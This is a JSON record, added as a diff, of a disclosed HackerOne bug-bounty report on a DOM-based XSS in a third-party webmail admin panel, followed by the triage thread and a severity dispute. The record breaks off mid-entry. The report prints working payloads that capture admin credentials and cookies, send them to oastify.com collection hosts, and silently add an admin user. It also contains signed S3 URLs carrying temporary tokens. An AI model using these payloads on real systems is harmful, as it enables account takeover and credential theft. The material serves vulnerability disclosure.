@@ -1,0 +1,555 @@
+{
+  "id": 1619445,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjE5NDQ1",
+  "url": "https://hackerone.com/reports/1619445",
+  "title": "Admin account/panel takeOver and Doing actions in admin panel via DOM-based XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-06-29T17:19:28.642Z",
+  "submitted_at": "2022-06-29T17:19:28.702Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mouhannadlrx",
+    "url": "/mouhannadlrx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2450,
+    "url": "https://hackerone.com/radancy",
+    "handle": "radancy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Radancy",
+      "twitter_handle": "",
+      "website": "https://radancy.nl",
+      "about": "Radancy NL is a full-service agency specialised in employer branding and recruitment advertising in the Netherlands"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-09-12T06:39:39.681Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-08-13T06:39:39.402Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello team ,\n\nI found Dom-XSS in your (https://████████/) Webmail Admin Panel that manage attacker to stealing admin sensitive info  and doing any action in your  webmail admin panel .\n\n## why and how this vulnerability happen :\n\n    - if your reviewed the source code of this endpoint of the admin panel \" view-source:https://██████████/admin/\" , you can see the vulnerable javascript sink which is document.write :\n\n                ``          \n                      if (█████.my█████.isMy█████Instance()) {\n\t\t                                    \tdocument.write('<script type=\"text/javascript\" src=\"' + ███.my████.getGeneratedDefaultsPath() + '\"><\\/script>');\n\t\t                             }\n                ``\n                     \n  you can see that this sink writing data (that including attacker controllable data  which is the value returned of this function `██████.my████.getGeneratedDefaultsPath() `  ) to the DOM without any sanitization or validation  .\n\n- if your reviewed the difination of  this function `██████.my███.getGeneratedDefaultsPath() ` in this js file \"https://████/admin/my████.js?v=563fd4e62ed50c2ec5695420aa8c280a\"  :\n\n``` █████████.my███████ = {\n    urlParams: function() {\n        var e, a, r, s, n = document.location.search.substr(1), t = n.split(\"&\"), i = {};\n        for (r = 0, s = t.length; s > r; r++) {\n            e = t[r].split(\"=\");\n            a = e[0];\n            i[a] = void 0 === e[1] ? \"\" : decodeURIComponent(e[1]);\n            if (window.JSON && (\"jsonHeaders\" === a || \"uploadHeaders\" === a)) {\n                i[a] = JSON.parse(i[a]);\n            }\n        }\n        return i;\n    }(),\n    isMy█████████Instance: function() {\n        return !!this.urlParams.appUrl;\n    },\n    getGeneratedDefaultsPath: function() {\n        var e = this.urlParams.appUrl;\n        e = e.substr(0, e.indexOf(\"/api/\"));\n        return e + \"/generatedDefaults.js?v=563fd4e62ed50c2ec5695420aa8c280a&X-InstanceId=\" + this.urlParams.jsonHeaders[\"X-InstanceId\"];\n    }\n};\n```\nyou can that the query string parameters is parssed via `urlParams` function and this paramters values then used in `getGeneratedDefaultsPath` function to generate the return value  by taking the value of `appUrl` parameters and passed it with the returned value , and as you can see there is no attacker controllable data sanitization or filtration , which enable attacker to pass malicious code via `appUrl` parameter to  the DOM sink (`document.write`) which manuplate the DOM and excute any code in the admin panel .\n\n\n##POC :\n\n\n1) in case the admin not logged in yet , attacker can  stealing the admin credentials , here steps to reproduce  :\n\n1 - change the value of `attackerServer` variable in the code below to your server .\n2 - just open this link  : \n       https://██████████/admin/?appUrl=x%22%3E%3C/script%3E%3Cscript%3Ealert(document.domain);window.onload%3D()%3D%3E{document.getElementById(%22myframe%22).contentDocument.getElementById(%22login-button%22).onclick%3D()%3D%3E{let%20attackerServer%3D\"https://dizw1b5gzqe6kw4f93zwtiez0q6hu6.oastify.com\";new%20Image().src%3D`${attackerServer}?AdminUsernameIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27username%27).value}%26%26AdminPasswordIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27password%27).value}`;}}%3C/script%3E%3Ciframe%20id%3D%22myframe%22%20src%3Dhttps://████/admin/login/%20style%3D%22position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20bottom%3A0%3B%20right%3A0%3B%20width%3A100%25%3B%20height%3A100%25%3B%20border%3Anone%3B%20margin%3A0%3B%20padding%3A0%3B%20overflow%3Ahidden%3B%20z-index%3A999999%3B%22%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}\n\nas you can see the xss alert is poped up , and when entering admin credintials and submiting it , this credentials will route to attacker server ( see the attachment video )\n\n2) in case the admin already logged in , attacker can steal the admin auth-token and doing any action in the admin panel , like adding new AdminUser , change admin password ,reading/sending mails ,....etc .\n and here the POC and steps to reproduce stealing admin auth-token and adding new AdminUser :\n\n         1 - first of all as i didn't have admin account in your panel , so  i was installed the ███ software that you are use to show you suitable POC .\n         2- now put this js code in external file in your server : \n                                        ``` \n                                             window.onload = () => {\n\n    let frame1 = document.createElement(\"iframe\");\n    frame1.src = \"http://127.0.0.1:4040/admin/#users\";\n\n\n    let frame2 = document.createElement(\"iframe\");\n    frame2.src = \"http://127.0.0.1:4040/admin/#users\";\n    frame2.setAttribute(\"style\", \"position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\")\n\n\n    document.body.appendChild(frame1);\n    document.body.appendChild(frame2);\n\n\n    function addNewAdmin() {\n\n\n        setTimeout(() => {\n            k_webAssist.k_showIframe = () => {\n                let prevertEROR = \"no worries\"\n            }\n            frame1.contentDocument.getElementById('users_k_bottomToolbar_k_btnAdd').click();\n        }, 3000)\n\n\n\n        setTimeout(() => {\n\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_loginName').value = 'NewUserNameFromAttacker';\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_password').value = 'Admin123123';\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_passwordConfirmation').value = 'Admin123123';\n\n            frame1.contentDocument.getElementById('userEditorAdd_k_tb_k_btnOk').click();\n        }, 5000)\n\n        return true;\n\n    }\n\n    function sendAuthTokenToAttacker() {\n        let attackerServer = 'https://kh5zh0fcso7usao2eu9fhu74wv2rqg.oastify.com';\n        let script=document.createElement('script');\n        script.src=attackerServer +\"?here the Auth-token:\"+JSON.stringify(document.cookie);\n        document.body.appendChild(script);\n    }\n\n\n    frame1.onload = () => {\n        if(addNewAdmin()==true)\n        sendAuthTokenToAttacker();\n    }\n\n}\n              \n```\n\n##Note: please don't forget to change `attackerServer ` to your which you want to route the `Auth-token` to it.\n\n3- now just edit the below link with `yourServer` and open it : \nhttp://127.0.0.1:4040/admin/?appUrl=%22%3E%3C/script%3E%3Cscript%20src%3Dhttps://yourServer.com/myScript.js%3E%3C/script%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}\n4- wait a little then the `auth-token` will route to attackerServer , and new AdminUser will added without any admin interaction!\n\n##End:\n-I hope the vulnerability and Impact/exploit it's clear to you now because I spent a lot of time to build this report as clear as :)\n\n- Best regards!\n\n## Impact\n\n- by executing JavaScript code in the admin browser , attacker can do any action in the admin panel without admin interaction and even takeOver the admin account/panel .",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1801247,
+      "file_name": "POC1.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4whp6ot2jhx9kqwlkihtpmc5x0fp?response-content-disposition=attachment%3B%20filename%3D%22POC1.mp4%22%3B%20filename%2A%3DUTF-8%27%27POC1.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ2EO4J6%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065308Z&X-Amz-Expires=2704&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIDdaOxaU2Kc7XK%2BFPO0xwEcua0EmQNQ0KITjMo%2BKI7S%2FAiAzEGtwS8msUueXSru5QP82dF7uwkPFZmzhjY8laBf5ySqxBQgiEAMaDDAxMzYxOTI3NDg0OSIMMwqH%2BrtGLzp0nfFJKo4FfKwfKYelWDcX3DZmXtAToi%2BfdIW%2FTskJuWscWNQ76Tnp8xifpkkQJqzgVzQ1mNVCoJr7%2BHlI2zJhu0AXuqUf6FD0aST%2BKfWDBNuzGTpRcWWnx07Sch98UNn54OsKQbkd78QdkYbYIIydcW4rDyHcf69tkUPFukaryTwqFIQUzVC34LtpkpFeA9lDvrXGajNXbhcjKrAFt5HqSOZuuuzssNNlvHJE05jjBky2NSGdLPAbwZ5PyWIPopmg1W4zjYBUwa%2F0z3qTgn0zEoCTBSKgTZOxPGLRSTPuvxrR0mqU9OcBLyJp193C17CIZVqQgijrtvyXYk%2FM2oDDkUsD7oeMeAFi8iq1vQlGMOgky5Mb4a6rOsWjihhywKDJptVFAvuD5Dj3tbSEYMt48EBT7kCNQd8x2uZADjILGD3cpoZLKeNeqFmfFNRBUEpMfGc5V1%2FI9fJ%2FzgQyr2nb6tNoGRs2QoePdMvOr42ig5kYNAYT7qahQE3vKgClxMTOREjRXfYOrHcHAtPXN4664bTPb1qQrBbF3foKJfwP06KCyM3rFnllobDOLYckn%2FGBEHSl4G2Hnse7CaI%2BGpBkpP0Ud8awKHx3d9xgtFAnC85ks1%2BkhSBq2pHVohOXkjxj3RfmbctowIVuWZvY6MfJpBsaoYyVxDQv%2BMuQlcCUEHl9AJ8Xs%2BWTD7tNE9FfrC4KY2BGHedJYf52GgTsQ7CuCfr5uJg4YBvuTmWyYN78uJu3nhB86AstH1doFZFbBt%2FroDTEUJfBYlS40afyu2h749TRxoiU4xcWDNDUIi%2B6zINKu9qI5X4XfH%2BoRrq7ZYgkoHQQRAW7YCYdirZLXoO2ETACtWPa5nyukSpsZ%2F8mmmkr4uC7MPP6uKgGOrIBCrIPzsKyYiYmXbfpjP3Q51XNqU0RvILr5XTqNaH6BkaJc7iqpnIwN%2FwpnoQ9ykcsf6gSCQUk9Fr3CRZm11fApJXeKbQ3cP7fcLscjO5J9oxYuZzrFKcuMO2l1VecXevCmP4wSmgs9gPOQP%2BjPbUXioCzwZ3NoL2q1W%2Bdvc2hJhiDeOCAy58REfH1mTOf633Nzxlb510ZtNV%2FKoIE6XLQtlIo6pnGn%2FyDTqTX7RGJ0U39bA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9c82cbfb527ecfdf7ce65345dcab64fa0c9feccb961bf423ec4ac761a57709e9",
+      "file_size": 8372155,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1801256,
+      "file_name": "bandicam_2022-06-29_20-01-05-032.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/71dz7cwy35gnob7alsp6mvadsti1?response-content-disposition=attachment%3B%20filename%3D%22bandicam_2022-06-29_20-01-05-032.mp4%22%3B%20filename%2A%3DUTF-8%27%27bandicam_2022-06-29_20-01-05-032.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSQ2EO4J6%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065308Z&X-Amz-Expires=2704&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIDdaOxaU2Kc7XK%2BFPO0xwEcua0EmQNQ0KITjMo%2BKI7S%2FAiAzEGtwS8msUueXSru5QP82dF7uwkPFZmzhjY8laBf5ySqxBQgiEAMaDDAxMzYxOTI3NDg0OSIMMwqH%2BrtGLzp0nfFJKo4FfKwfKYelWDcX3DZmXtAToi%2BfdIW%2FTskJuWscWNQ76Tnp8xifpkkQJqzgVzQ1mNVCoJr7%2BHlI2zJhu0AXuqUf6FD0aST%2BKfWDBNuzGTpRcWWnx07Sch98UNn54OsKQbkd78QdkYbYIIydcW4rDyHcf69tkUPFukaryTwqFIQUzVC34LtpkpFeA9lDvrXGajNXbhcjKrAFt5HqSOZuuuzssNNlvHJE05jjBky2NSGdLPAbwZ5PyWIPopmg1W4zjYBUwa%2F0z3qTgn0zEoCTBSKgTZOxPGLRSTPuvxrR0mqU9OcBLyJp193C17CIZVqQgijrtvyXYk%2FM2oDDkUsD7oeMeAFi8iq1vQlGMOgky5Mb4a6rOsWjihhywKDJptVFAvuD5Dj3tbSEYMt48EBT7kCNQd8x2uZADjILGD3cpoZLKeNeqFmfFNRBUEpMfGc5V1%2FI9fJ%2FzgQyr2nb6tNoGRs2QoePdMvOr42ig5kYNAYT7qahQE3vKgClxMTOREjRXfYOrHcHAtPXN4664bTPb1qQrBbF3foKJfwP06KCyM3rFnllobDOLYckn%2FGBEHSl4G2Hnse7CaI%2BGpBkpP0Ud8awKHx3d9xgtFAnC85ks1%2BkhSBq2pHVohOXkjxj3RfmbctowIVuWZvY6MfJpBsaoYyVxDQv%2BMuQlcCUEHl9AJ8Xs%2BWTD7tNE9FfrC4KY2BGHedJYf52GgTsQ7CuCfr5uJg4YBvuTmWyYN78uJu3nhB86AstH1doFZFbBt%2FroDTEUJfBYlS40afyu2h749TRxoiU4xcWDNDUIi%2B6zINKu9qI5X4XfH%2BoRrq7ZYgkoHQQRAW7YCYdirZLXoO2ETACtWPa5nyukSpsZ%2F8mmmkr4uC7MPP6uKgGOrIBCrIPzsKyYiYmXbfpjP3Q51XNqU0RvILr5XTqNaH6BkaJc7iqpnIwN%2FwpnoQ9ykcsf6gSCQUk9Fr3CRZm11fApJXeKbQ3cP7fcLscjO5J9oxYuZzrFKcuMO2l1VecXevCmP4wSmgs9gPOQP%2BjPbUXioCzwZ3NoL2q1W%2Bdvc2hJhiDeOCAy58REfH1mTOf633Nzxlb510ZtNV%2FKoIE6XLQtlIo6pnGn%2FyDTqTX7RGJ0U39bA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d2c3e3cda1c02d88bc4ef4564a14f489d5dc98baf425a377aff3429cdd8ac300",
+      "file_size": 18564212,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-09-12T06:39:39.501Z",
+  "allow_singular_disclosure_after": -951209.295937193,
+  "singular_disclosure_allowed": true,
+  "vote_count": 47,
+  "voters": [
+    "mr-medi",
+    "p4n7h3rx",
+    "7odamoo",
+    "zy9ard3",
+    "neil-tsakatsa",
+    "shubham_srt",
+    "dilawer",
+    "cmdumb",
+    "kmxx",
+    "anasbetis023",
+    "and 37 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 162,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.maximum.nl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 17352066,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "- Note :  this vulnerability is not fixed in the latest version of ██████.\n",
+      "automated_response": false,
+      "created_at": "2022-06-29T17:22:38.314Z",
+      "updated_at": "2023-08-13T09:08:09.102Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17366623,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2022-06-30T14:49:56.512Z",
+      "updated_at": "2022-06-30T14:49:56.512Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "Medium",
+        "old_severity_id": 1563295,
+        "new_severity_id": 1564819
+      },
+      "actor": {
+        "username": "bamie",
+        "cleared": false,
+        "verified": false,
+        "url": "/bamie",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/631/8aff5981b7c2a3519ed7170def4f7ad2392d13da_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17366856,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hey @strglrx \n\nThanks for your splendid and detailed report! The effort you put into it caused me to to take a close(r) look even though ██████████ is third party software :)\n\n█████████ is third party software, so fixing it is kinda outside our scope. Especially since the latest version is still vulnerable. Did you report it to ████████ as well? Since they are the only ones who can actually fix this correctly.\n\nI checked the usage of the `appUrl` parameter and concluded the parameter is unused in a self hosted instance. I reckon it's part of something like https://my.███████.com/\n\nApart from the technical exploit, there's the issue of getting a malicious link to someone with access which also blatantly ignores all sanity checks by clicking the link and not noticing the unexpected rendering and responses is quite tough ;)\n\nYou're in luck as we recently made a transition putting a reverse proxy in front of the the web interface of ███████ which allows us some level of control over the http traffic. Not so much the ████████ application itself obviously, but it allows us to block the `appUrl` parameter.\n\nSending a request with the `appUrl` parameter will now block the request immediately. See https://████████/admin/?appUrl=1\nEffectively remediating the issue.\n\nBare in mind that ██████████ is still third party software so there's not an awful lot we can do to all vulnerabilities/exploits.\n\nI'll assign my colleague to assign bounty\n\nHang tight!\n",
+      "automated_response": false,
+      "created_at": "2022-06-30T15:14:57.475Z",
+      "updated_at": "2023-08-13T09:08:18.279Z",
+      "actor": {
+        "username": "bamie",
+        "cleared": false,
+        "verified": false,
+        "url": "/bamie",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/631/8aff5981b7c2a3519ed7170def4f7ad2392d13da_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "mouhannadlrx",
+        "url": "/mouhannadlrx"
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17369233,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bamie, thanks for the response \n\nI know that ████████ is a third party because I read your bug bounty program policy well, where you said in the policy that ████ is vulnerability in your scope if it didn't fixed , right ?\nand if you are not interested to secure this asset basically you can not put it in your scope to not waisting researcher time/effort , regard that you can fix it basically by just something like URL encoding of the returned value of the vulnerable function or like how you fixed it now.\n\nand can you please tell me where the \" unexpected rendering and responses is quite tough \" in my POC ?\nin the firstonen he normally willlog inn and no other unintended things require to do to trigger the exploit .\nin the second even it's not required to open the malicious link to trigger the exploit ( because he already logged in ), and basically attacker can embed your vulnerable website hiddenly in a clear/non-malicious website and when the admin user visits this website the exploit will be executed without any interaction or rendering!\n\nIam  just frustrated because I found this vulnerability more than 10 days ago and I didn't reported to you like other researcher with just stupid alert(1) without any detail , and because itis  in webmail server administration and with all impact I was show to you , take it as medium like normal alert(1) XSS this totally unfair.\n\nI hope you take a look again and thank you anyway .\n\n- best regards.\n\n",
+      "automated_response": false,
+      "created_at": "2022-06-30T16:57:55.602Z",
+      "updated_at": "2023-08-13T09:08:09.077Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17396560,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @strglrx \n\nI'm under the impression that you misunderstood my response. We did accept your report, and the issue has been fixed. The report is resolved (so it's not closed as Informative for example) and you will receive bounty.\n\nRegards",
+      "automated_response": false,
+      "created_at": "2022-07-04T07:32:02.636Z",
+      "updated_at": "2022-07-04T07:32:02.636Z",
+      "actor": {
+        "username": "bamie",
+        "cleared": false,
+        "verified": false,
+        "url": "/bamie",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/631/8aff5981b7c2a3519ed7170def4f7ad2392d13da_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17404371,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bamie \n(if you was read my comment ) , you can see that my problem not why didn't give me a bounty or closed as N/A , but why you closed it as medium severity where I escalated it to account takeOver and in the webmail server admin panel and you closed it as medium !!!  \n\n-Thanks anyway ",
+      "automated_response": false,
+      "created_at": "2022-07-04T13:06:04.324Z",
+      "updated_at": "2022-07-04T13:06:04.324Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17546993,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bamie ,\nAny update?\nAnd please can  I disclosing this report ?\n\n",
+      "automated_response": false,
+      "created_at": "2022-07-13T18:54:29.599Z",
+      "updated_at": "2022-07-13T18:54:29.599Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17704950,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @mouhannad ,\n\nThanks for your patience.\nYea sure, the report can be disclosed if you want. Probably some information has to be redacted, but that's no problem.\n\nMy colleague was on holiday. He does a hackerone payout run every now and than :)\n\nRegards,\nBamie",
+      "automated_response": false,
+      "created_at": "2022-07-25T14:55:00.373Z",
+      "updated_at": "2022-07-25T14:55:00.373Z",
+      "actor": {
+        "username": "bamie",
+        "cleared": false,
+        "verified": false,
+        "url": "/bamie",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/631/8aff5981b7c2a3519ed7170def4f7ad2392d13da_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17706987,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bamie , no problem :)\n\nSo there is no chance to edit the severity ?\n\n- Best Regards :)",
+      "automated_response": false,
+      "created_at": "2022-07-25T16:48:01.986Z",
+      "updated_at": "2022-07-25T16:48:01.986Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17706989,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @bamie , no problem :)\n\nSo there is no chance to edit the severity ?\n\n- Best Regards :)",
+      "automated_response": false,
+      "created_at": "2022-07-25T16:48:14.396Z",
+      "updated_at": "2022-07-25T16:48:14.396Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17737772,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Risk from our side is around medium. Impact is fair and chance of this issue being exploited is low :)",
+      "automated_response": false,
+      "created_at": "2022-07-27T12:12:03.055Z",
+      "updated_at": "2022-07-27T12:12:03.055Z",
+      "actor": {
+        "username": "bamie",
+        "cleared": false,
+        "verified": false,
+        "url": "/bamie",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/631/8aff5981b7c2a3519ed7170def4f7ad2392d13da_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17737797,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ok  ، Thank you and waiting for the bounty :)",
+      "automated_response": false,
+      "created_at": "2022-07-27T12:14:33.994Z",
+      "updated_at": "2022-07-27T12:14:33.994Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "radancy"
+    },
+    {
+      "id": 17765923,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks!",
+      "automated_response": false,
+      "created_at": "2022-07-29T08:41:17.347Z",
+      "updated_at": "2022-07-29T08:41:17.347Z",
+      "actor": {
+        "url": "/radancy",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "Radancy"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "radancy",
+      "collaborator": {
+        "username": "mouhannadlrx",
+        "url": "/mouhannadlrx"
+      }
+    },
+    {
+      "id": 17766085,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for the bounty!\nShouldn't I get an  bonus  for the report as you response \"Thanks for your splendid and detailed report! The effort you put into it caused me to to take a close(r) look \".\n\nThanks anyway!",
+      "automated_response": false,
+      "created_at": "2022-07-29T08:50:19.570Z",
+      "updated_at": "2022-07-29T08:50:19.570Z",
+      "actor": {
+        "username": "mouhannadlrx",
+        "cleared": false,
+        "verified": false,
+        "url": "/mouhannadlrx",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
